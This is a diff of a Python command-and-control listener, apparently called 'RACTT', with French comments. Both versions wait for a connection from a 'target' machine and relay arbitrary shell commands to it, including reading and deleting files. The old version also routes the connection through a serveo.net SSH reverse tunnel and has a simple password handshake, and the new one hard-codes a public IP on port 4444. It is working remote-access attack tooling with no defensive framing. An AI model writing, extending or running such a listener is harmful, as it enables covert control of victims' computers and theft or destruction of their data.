@@ -1,75 +1,58 @@
 import socket
-import subprocess
-import time
-import os
-import platform
+import sys
 
 # --- CONFIGURATION ---
-PORT_LOCAL = 4444
-PASSWORD = "1234"
-ID_URL = "103fa379dfd22edd-93-23-16-243" # Votre ID Serveo
+PORT = 4444
 
 HELP_MENU = """
 ╔══════════════════════════════════════════════════════╗
-║                COMMANDES DE CONTRÔLE                 ║
+║                MENU D'AIDE RACTT                     ║
 ╠══════════════════════════════════════════════════════╣
 ║  help             → Affiche ce menu                  ║
-║  popup:Message    → Alerte sur l'écran cible         ║
-║  speak:Texte      → Synthèse vocale (espeak)         ║
-║  browser:URL      → Ouvre un site web                ║
-║  lock             → Verrouille la session            ║
-║  battery          → État de la batterie              ║
+║  ls / dir         → Lister les fichiers              ║
+║  whoami           → Nom de l'utilisateur cible       ║
+║  cd [dossier]     → Changer de répertoire            ║
+║  cat [fichier]    → Lire le contenu d'un fichier     ║
+║  rm [fichier]     → Supprimer un fichier             ║
 ║  exit             → Fermer la connexion              ║
-║  [commande]       → Commande shell (ex: ls, pwd)     ║
+║  [commande shell] → Toute commande Linux/Windows     ║
 ╚══════════════════════════════════════════════════════╝
 """
 
-def lancer_tunnel():
-    print(f"[*] Initialisation du tunnel mondial : {ID_URL}.serveousercontent.com")
-    cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"{ID_URL}:80:localhost:{PORT_LOCAL}", "serveo.net"]
-    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
 def start_server():
-    tunnel = lancer_tunnel()
-    time.sleep(5) # Attente de l'établissement du tunnel
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(("0.0.0.0", PORT))
+    s.listen(1)
+    
+    print(f"[*] En attente sur le port {PORT} (IP: 77.207.25.30)...")
+    conn, addr = s.accept()
+    print(f"[+] Connecté à : {addr[0]}")
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.bind(('0.0.0.0', PORT_LOCAL))
-        s.listen(1)
-        print(f"[*] Serveur prêt. En attente de la cible...")
+    while True:
+        # Recevoir la réponse de la cible
+        conn.settimeout(1.0)
+        try:
+            data = conn.recv(4096).decode('utf-8', errors='ignore')
+            if data: sys.stdout.write(data)
+        except socket.timeout:
+            pass
 
-        while True:
-            try:
-                conn, addr = s.accept()
-                # Réception des infos d'identification du client
-                infos_client = conn.recv(1024).decode()
-                print(f"\n[+] CONNEXION REÇUE\n{infos_client}")
-                
-                conn.sendall(b"AUTH_REQUIRED")
-                if conn.recv(1024).decode() == PASSWORD:
-                    conn.sendall(b"AUTH_SUCCESS")
-                    print("[*] Accès validé. Tapez 'help' pour les commandes.")
-                    
-                    while True:
-                        cmd = input("RACTT > ").strip()
-                        if not cmd: continue
-                        if cmd.lower() == "help":
-                            print(HELP_MENU)
-                            continue
-                        
-                        conn.sendall(cmd.encode())
-                        if cmd.lower() == "exit": break
-                        
-                        reponse = conn.recv(10240).decode()
-                        print(f"\n{reponse}")
-                else:
-                    conn.sendall(b"AUTH_FAILED")
-                conn.close()
-            except KeyboardInterrupt:
-                print("\n[*] Arrêt du serveur...")
-                tunnel.terminate()
-                break
+        # Entrer une commande
+        cmd = input("RACTT > ").strip()
+        
+        if not cmd: continue
+
+        # --- GESTION DE L'AIDE LOCALE ---
+        if cmd.lower() == "help":
+            print(HELP_MENU)
+            continue 
+
+        if cmd.lower() == "exit":
+            conn.send(b"exit\n")
+            break
+
+        conn.send((cmd + "\n").encode())
 
 if __name__ == "__main__":
     start_server()
